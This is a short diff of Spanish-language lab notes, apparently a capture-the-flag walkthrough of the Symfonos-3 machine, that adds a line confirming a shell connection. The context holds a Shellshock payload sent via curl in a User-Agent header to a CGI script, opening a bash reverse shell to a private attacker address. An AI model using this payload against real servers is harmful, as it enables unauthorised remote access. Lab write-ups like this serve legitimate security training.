@@ -800,9 +800,13 @@ python3 -m http.server 6060
 ![[Pasted image 20240622202427.png]]
 
 `Paso-4 Symfonos-3`
-ejecutamos la petición nuevamente y ahora intentamos nuestra reverse shell
+ejecutamos la petición nuevamente y ahora inyectamos nuestra reverse shell
 ```python
 sudo proxychains curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.3.2.7/3464 0>&1' http://10.3.2.6/cgi-bin/underworld/admin.cgi 2>/dev/null
 ```
 
 ![[Pasted image 20240622204920.png]]
+
+`Maquina Attack`
+efectivamente. la conexion 
+![[Pasted image 20240622205127.png]]
